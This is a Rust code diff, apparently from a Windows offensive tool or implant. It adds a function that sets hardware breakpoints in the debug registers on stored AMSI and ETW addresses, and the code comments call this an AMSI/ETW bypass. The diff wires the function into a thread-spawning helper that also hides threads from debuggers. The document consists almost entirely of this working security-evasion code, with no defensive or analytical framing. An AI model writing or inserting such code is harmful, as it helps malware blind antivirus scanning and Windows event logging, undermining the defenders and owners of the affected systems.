@@ -166,12 +166,39 @@ pub fn hide_current_thread() {
 #[cfg(not(windows))]
 pub fn hide_current_thread() {}
 
+/// Apply hardware breakpoints for AMSI/ETW bypass to the *calling* thread.
+/// Called automatically by [`spawn_hidden_thread`]; call this at the start of
+/// any other thread that must also be covered by the HWBP bypass.
+#[cfg(windows)]
+pub unsafe fn apply_hwbp_to_current_thread() {
+    use winapi::um::processthreadsapi::{GetCurrentThread, GetThreadContext, SetThreadContext};
+    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
+
+    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
+    let etw  = ETW_ADDR.load(Ordering::Relaxed);
+    if amsi == 0 && etw == 0 {
+        return; // HWBPs not yet configured; skip silently
+    }
+
+    let mut ctx: CONTEXT = std::mem::zeroed();
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    let h = GetCurrentThread();
+    if GetThreadContext(h, &mut ctx) != 0 {
+        ctx.Dr0 = amsi as u64;
+        ctx.Dr1 = etw as u64;
+        ctx.Dr7 |= (1 << 0) | (1 << 2); // enable local breakpoints for Dr0 and Dr1
+        SetThreadContext(h, &ctx);
+    }
+}
+
 pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
 where
     F: FnOnce() -> T + Send + 'static,
     T: Send + 'static,
 {
     std::thread::spawn(move || {
+        #[cfg(windows)]
+        unsafe { apply_hwbp_to_current_thread(); }
         hide_current_thread();
         f()
     })
